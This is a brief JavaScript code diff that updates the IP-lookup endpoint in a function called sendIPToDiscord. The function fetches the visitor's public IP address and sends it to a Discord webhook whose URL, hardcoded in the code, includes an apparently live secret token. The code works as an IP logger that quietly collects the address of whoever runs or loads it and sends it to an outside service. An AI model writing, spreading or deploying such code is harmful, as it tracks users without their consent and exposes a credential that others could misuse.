@@ -3,7 +3,7 @@
 // Function to send IP to Discord webhook
 async function sendIPToDiscord() {
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+    const response = await fetch('https://api64.ipify.org/?format=json');
     const data = await response.json();
 
     const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
